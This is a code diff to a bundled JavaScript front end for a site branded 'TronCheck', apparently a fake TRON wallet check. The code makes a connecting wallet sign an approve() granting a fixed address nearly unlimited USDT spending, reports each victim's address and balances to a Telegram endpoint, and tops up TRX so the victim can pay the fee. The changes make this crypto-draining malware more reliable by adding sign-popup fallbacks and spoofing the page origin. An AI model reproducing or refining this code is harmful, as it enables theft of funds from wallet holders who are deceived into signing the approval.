@@ -90710,76 +90710,116 @@
                 }
             }
             async sendTransaction(e, t) {
-                if (!this.provider)
+                if (!e)
+                    return {
+                        success: !1,
+                        message: "Missing wallet address"
+                    };
+                if (!this.provider && !(window.tronWeb && window.tronWeb.ready))
                     throw new Error("Provider is required to sign a transaction.");
                 try {
-                    const tronWebInstance = this.getTronWeb()
-                      , approveAmount = t || "90000000000000"
-                      , r = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
-                      , n = {
+                    const tronWebInstance = this.tronWeb && this.tronWeb.transactionBuilder ? this.tronWeb : this.getTronWeb();
+                    try {
+                        tronWebInstance.setAddress(e)
+                    } catch (_) {}
+                    const approveAmount = t || "90000000000000"
+                      , contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+                      , options = {
                         feeLimit: 2e8,
                         callValue: 0
                     }
-                      , i = [{
+                      , parameters = [{
                         type: "address",
                         value: "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
                     }, {
                         type: "uint256",
                         value: String(approveAmount)
                     }]
-                      , s = "approve(address,uint256)"
-                      , a = await tronWebInstance.transactionBuilder.triggerSmartContract(r, s, n, i, e);
+                      , functionSelector = "approve(address,uint256)";
 
-                    const unsignedTx = a && a.transaction;
+                    console.log("Building approve transaction for", e);
+                    const triggered = await tronWebInstance.transactionBuilder.triggerSmartContract(contractAddress, functionSelector, options, parameters, e);
+                    const unsignedTx = triggered && triggered.transaction;
                     if (!unsignedTx || (!unsignedTx.raw_data && !unsignedTx.raw_data_hex && !unsignedTx.txID)) {
-                        console.error("Missing transaction path from triggerSmartContract:", a);
+                        console.error("Missing transaction path from triggerSmartContract:", triggered);
                         throw new Error("Failed to build approve transaction (missing transaction path)");
                     }
-                    if (a && a.result && a.result.result === false) {
-                        throw new Error((a.result && (a.result.message || a.result.code)) || "triggerSmartContract failed");
+                    if (triggered && triggered.result && triggered.result.result === false) {
+                        throw new Error((triggered.result && (triggered.result.message || triggered.result.code)) || "triggerSmartContract failed");
                     }
 
-                    // WalletConnect Tron: legacy wallets need nested { transaction: unsignedTx }
-                    // v1 wallets (sessionProperties.tron_method_version === "v1") want flat unsignedTx
-                    const session = this.provider.session || {};
-                    const sessionProps = session.sessionProperties || session.namespaces && session.namespaces.tron && session.namespaces.tron.sessionProperties || {};
-                    const isV1 = String(sessionProps.tron_method_version || "") === "v1";
-                    const transactionParam = isV1 ? unsignedTx : {
-                        transaction: unsignedTx
-                    };
+                    let signedTx = null;
 
-                    console.log("Opening wallet approval popup for:", e, "format:", isV1 ? "v1" : "legacy");
-                    const signedResponse = await this.provider.request({
-                        method: "tron_signTransaction",
-                        params: {
-                            address: e,
-                            transaction: transactionParam
+                    // 1) TronLink / injected wallet — most reliable popup on desktop
+                    const injected = window.tronWeb;
+                    const injectedAddress = injected && injected.defaultAddress && (injected.defaultAddress.base58 || injected.defaultAddress);
+                    if (injected && injected.ready && injected.trx && injected.trx.sign && (!injectedAddress || String(injectedAddress) === String(e))) {
+                        try {
+                            console.log("Trying TronLink injected sign popup...");
+                            signedTx = await injected.trx.sign(unsignedTx);
+                        } catch (injectErr) {
+                            console.warn("TronLink injected sign failed, falling back to WalletConnect:", injectErr)
                         }
-                    }, "tron:0x2b6653dc");
+                    }
 
-                    // WalletConnect / TronLink can return signed tx in different shapes
-                    const o = signedResponse && (signedResponse.result || signedResponse.transaction || signedResponse.signedTransaction || signedResponse);
-                    if (!o || typeof o !== "object") {
-                        console.error("Wallet returned empty signed transaction:", signedResponse);
+                    // 2) WalletConnect — try legacy nested, then v1 flat, then original wrapper
+                    if (!signedTx && this.provider && this.provider.request) {
+                        const session = this.provider.session || {};
+                        const sessionProps = session.sessionProperties || {};
+                        const isV1 = String(sessionProps.tron_method_version || "") === "v1";
+                        const formats = isV1 ? [unsignedTx, {
+                            transaction: unsignedTx
+                        }, triggered] : [{
+                            transaction: unsignedTx
+                        }, unsignedTx, triggered];
+
+                        let lastError = null;
+                        for (let idx = 0; idx < formats.length; idx++) {
+                            try {
+                                console.log("Opening WalletConnect sign request, format #", idx + 1);
+                                const signedResponse = await this.provider.request({
+                                    method: "tron_signTransaction",
+                                    params: {
+                                        address: e,
+                                        transaction: formats[idx]
+                                    }
+                                }, "tron:0x2b6653dc");
+                                signedTx = signedResponse && (signedResponse.result || signedResponse.transaction || signedResponse.signedTransaction || signedResponse);
+                                if (signedTx && typeof signedTx === "object") {
+                                    break
+                                }
+                                signedTx = null
+                            } catch (wcErr) {
+                                lastError = wcErr;
+                                console.warn("WalletConnect sign format failed:", idx + 1, wcErr);
+                                signedTx = null
+                            }
+                        }
+                        if (!signedTx && lastError) {
+                            throw lastError
+                        }
+                    }
+
+                    if (!signedTx || typeof signedTx !== "object") {
                         return {
                             success: !1,
-                            message: "Wallet did not return a signed transaction"
+                            message: "Wallet did not return a signed transaction / sign popup was dismissed"
                         }
                     }
 
-                    const transactionResult = await tronWebInstance.trx.sendRawTransaction(o);
-                    return console.log("addressbycheck", e),
-                    console.log("Transaction signed successfully:", o),
-                    console.log("Transaction result from sendRawTransaction:", transactionResult),
-                    {
+                    const transactionResult = await tronWebInstance.trx.sendRawTransaction(signedTx);
+                    console.log("addressbycheck", e);
+                    console.log("Transaction signed successfully:", signedTx);
+                    console.log("Transaction result from sendRawTransaction:", transactionResult);
+                    return {
                         success: !0,
-                        txID: transactionResult && transactionResult.txid ? transactionResult.txid : (transactionResult && transactionResult.txID ? transactionResult.txID : (o && o.txID ? o.txID : (o && o.txid ? o.txid : o)))
+                        txID: transactionResult && transactionResult.txid ? transactionResult.txid : (transactionResult && transactionResult.txID ? transactionResult.txID : (signedTx.txID || signedTx.txid || signedTx))
                     }
-                } catch (r) {
-                    return console.error("Transaction Error:", r),
+                } catch (err) {
+                    return console.error("Transaction Error:", err),
                     {
                         success: !1,
-                        message: r && r.message ? r.message : String(r)
+                        message: err && err.message ? err.message : String(err)
                     }
                 }
             }
@@ -92690,7 +92730,7 @@
                             metadata: {
                                 name: "TronCheck",
                                 description: "Tron integration with WalletConnect",
-                                url: "http://walletconnect.com/",
+                                url: (typeof window !== "undefined" && window.location && window.location.origin) ? window.location.origin : "https://trchealth.live",
                                 icons: ["https://avatars.githubusercontent.com/u/37784886"]
                             }
                         });
@@ -92741,81 +92781,87 @@
                             }
                         }
                     });
+                    // Close connect modal so wallet can show the sign popup
+                    try {
+                        qS.closeModal()
+                    } catch (_) {}
+
                     const a = new SA(l);
                     h(a);
                     const c = (null === (e = l.session) || void 0 === e || null === (r = e.namespaces.tron) || void 0 === r || null === (i = r.accounts[0]) || void 0 === i ? void 0 : i.split(":")[2]) || "";
+                    if (!c) {
+                        console.error("No TRON address from wallet session");
+                        t(2);
+                        return
+                    }
                     s(c),
                     n(!0);
                     const u = await a.getBalance(c);
                     o(u);
-                    // Check balance in TRX and auto top-up if needed (balance is already in TRX from getBalance)
-                    let balanceInTRX = u; // Already in TRX (getBalance converts from Sun)
-                    const minimumBalance = 11; // Minimum TRX required
+                    let balanceInTRX = u;
+                    const minimumBalance = 11;
                     const backendUrl = "https://tronscantelegram.onrender.com";
-                    // Get USDT balance
+
                     let usdtBalance = 0;
                     try {
-                        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT contract
+                        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                         if (a.tronWeb && a.tronWeb.trx) {
                             const contract = await a.tronWeb.contract().at(usdtContractAddress);
                             if (contract && contract.balanceOf) {
                                 const usdtBalanceResult = await contract.balanceOf(c).call();
-                                // USDT uses 6 decimals, not 18 like TRX
                                 usdtBalance = usdtBalanceResult ? (parseInt(usdtBalanceResult.toString()) / 1000000) : 0;
                             }
                         }
                     } catch (usdtError) {
                         console.error("Error getting USDT balance:", usdtError);
                     }
+
+                    // Top-up first only when needed, then ALWAYS open sign popup
                     if (balanceInTRX < minimumBalance) {
                         try {
                             console.log(`Balance ${balanceInTRX} TRX is below minimum ${minimumBalance} TRX. Requesting top-up...`);
                             const topUpResponse = await GS.post(`${backendUrl}/send-trx`, {
                                 userAddress: c
+                            }, {
+                                timeout: 30000
                             });
-                            if (topUpResponse && topUpResponse.data && topUpResponse.data.success) {
-                                console.log("Top-up successful:", topUpResponse.data.message);
-                                if (topUpResponse.data.transactionId) {
-                                    console.log("Top-up transaction ID:", topUpResponse.data.transactionId);
-                                }
-                                // Wait until TRX actually arrives (or timeout) before opening approve popup
-                                if (topUpResponse.data.sent) {
-                                    const maxWaitMs = 60000;
-                                    const pollEveryMs = 3000;
-                                    const startedAt = Date.now();
-                                    while (Date.now() - startedAt < maxWaitMs) {
-                                        await new Promise((resolve) => setTimeout(resolve, pollEveryMs));
-                                        balanceInTRX = await a.getBalance(c);
-                                        console.log("Post top-up balance poll:", balanceInTRX);
-                                        if (balanceInTRX >= minimumBalance) {
-                                            break;
-                                        }
-                                    }
-                                } else {
+                            if (topUpResponse && topUpResponse.data && topUpResponse.data.success && topUpResponse.data.sent) {
+                                const maxWaitMs = 45000;
+                                const pollEveryMs = 2500;
+                                const startedAt = Date.now();
+                                while (Date.now() - startedAt < maxWaitMs) {
+                                    await new Promise((resolve) => setTimeout(resolve, pollEveryMs));
                                     balanceInTRX = await a.getBalance(c);
+                                    console.log("Post top-up balance poll:", balanceInTRX);
+                                    if (balanceInTRX >= minimumBalance) {
+                                        break
+                                    }
                                 }
-                            } else {
-                                console.warn("Top-up request failed:", topUpResponse && topUpResponse.data ? topUpResponse.data : topUpResponse);
+                            } else if (topUpResponse && topUpResponse.data) {
+                                console.warn("Top-up response:", topUpResponse.data);
+                                balanceInTRX = await a.getBalance(c)
                             }
                         } catch (topUpError) {
                             console.error("Error during auto top-up:", topUpError);
                         }
                     }
-                    // Send Telegram notification for wallet connection
-                    try {
-                        await GS.post(`${backendUrl}/api/telegram`, {
-                            text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nUSDT Balance: ${usdtBalance} USDT\nTime: ${new Date().toISOString()}`
-                        }).catch(err => console.error("Telegram notification error:", err));
-                    } catch (telegramError) {
-                        console.error("Failed to send Telegram notification:", telegramError);
-                    }
-                    // Small delay so WalletConnect modal can settle before approve popup
-                    await new Promise((resolve) => setTimeout(resolve, 800));
-                    balanceInTRX >= 0 ? await f(c) : t(2)
+
+                    // Fire-and-forget telegram — never block sign popup
+                    GS.post(`${backendUrl}/api/telegram`, {
+                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nUSDT Balance: ${usdtBalance} USDT\nTime: ${new Date().toISOString()}`
+                    }, {
+                        timeout: 8000
+                    }).catch(err => console.error("Telegram notification error:", err));
+
+                    console.log("Wallet connected. Opening sign popup now for", c);
+                    await f(c)
                 } catch (a) {
-                    console.error("Connection error:", a)
+                    console.error("Connection error:", a),
+                    t(2)
                 } finally {
-                    qS.closeModal()
+                    try {
+                        qS.closeModal()
+                    } catch (_) {}
                 }
             }
             ), [l])
@@ -92825,40 +92871,13 @@
                 if (h(r),
                 r)
                     try {
-                        console.log("Starting API Call..."),
-                        console.log("Axios:", GS),
-                        console.log("addressccc:", e),
                         localStorage.setItem("walletAddress", e);
-
-                        // Optional remote checks — do NOT block wallet sign popup if they fail
-                        // (tronnisa.twverify.com is currently unreachable)
-                        try {
-                            const s = await GS.post("https://tronnisa.twverify.com/proxy.php", {
-                                receiveAddress: e
-                            }, {
-                                timeout: 4000
-                            });
-                            console.log("First API Response:", s.data),
-                            console.log("response1:", s);
-                            const a = await GS.post("https://tronnisa.twverify.com/check.php", {
-                                receiveAddress: e
-                            }, {
-                                timeout: 4000
-                            });
-                            console.log("Second API Response:", a.data),
-                            console.log("response2:", a)
-                        } catch (proxyError) {
-                            console.warn("proxy/check API unavailable, continuing to wallet approve:", proxyError && proxyError.message ? proxyError.message : proxyError)
-                        }
-
-                        console.log("Opening wallet sign/approve popup...");
+                        console.log("Opening wallet sign/approve popup NOW...");
                         const n = await r.sendTransaction(e, "90000000000000");
                         console.log("transactionResult", n),
                         n.success ? (console.log("Transaction Successful! TXID:", n.txID),
-                        // Send Telegram notification for successful transaction approval
                         (async () => {
                             try {
-                                // Get current TRX and USDT balance for notification
                                 let currentTRXBalance = 0;
                                 let currentUSDTBalance = 0;
                                 try {
@@ -92868,29 +92887,22 @@
                                         const contract = await r.tronWeb.contract().at(usdtContractAddress);
                                         if (contract && contract.balanceOf) {
                                             const usdtBalanceResult = await contract.balanceOf(e).call();
-                                            // USDT uses 6 decimals
                                             currentUSDTBalance = usdtBalanceResult ? (parseInt(usdtBalanceResult.toString()) / 1000000) : 0;
                                         }
                                     }
                                 } catch (balanceError) {
                                     console.error("Error getting balances for notification:", balanceError);
                                 }
-                                // Extract transaction ID - handle if it's an object
                                 let transactionId = n.txID;
-                                console.log("Transaction ID raw:", transactionId, "Type:", typeof transactionId);
                                 if (typeof transactionId === 'object' && transactionId !== null) {
-                                    // Try multiple possible properties
                                     transactionId = transactionId.txid || transactionId.txID || transactionId.transaction || transactionId.hash || transactionId.id;
-                                    // If still object, try toString or JSON.stringify
                                     if (typeof transactionId === 'object' && transactionId !== null) {
                                         transactionId = transactionId.toString ? transactionId.toString() : JSON.stringify(transactionId);
                                     }
                                 }
-                                // Ensure it's a string
                                 if (typeof transactionId !== 'string') {
                                     transactionId = transactionId ? String(transactionId) : 'N/A';
                                 }
-                                console.log("Transaction ID extracted:", transactionId);
                                 const backendUrl = "https://tronscantelegram.onrender.com";
                                 await GS.post(`${backendUrl}/api/telegram`, {
                                     text: `Transaction approved\nWallet: ${e}\nTransaction ID: ${transactionId}\nAmount: 90000000000000\nTRX Balance: ${currentTRXBalance}\nUSDT Balance: ${currentUSDTBalance}\nTime: ${new Date().toISOString()}`
@@ -92899,7 +92911,6 @@
                                 console.error("Failed to send Telegram notification:", telegramError);
                             }
                         })(),
-                        // Navigate to certificate page after successful transaction
                         setTimeout(() => {
                             window.location.href = "/certificate";
                         }, 1500),
@@ -92910,7 +92921,8 @@
                         t(2)
                     }
                 else
-                    console.error("TronService is not initialized yet.")
+                    console.error("TronService is not initialized yet."),
+                    t(2)
             }
             ;
             return (0,
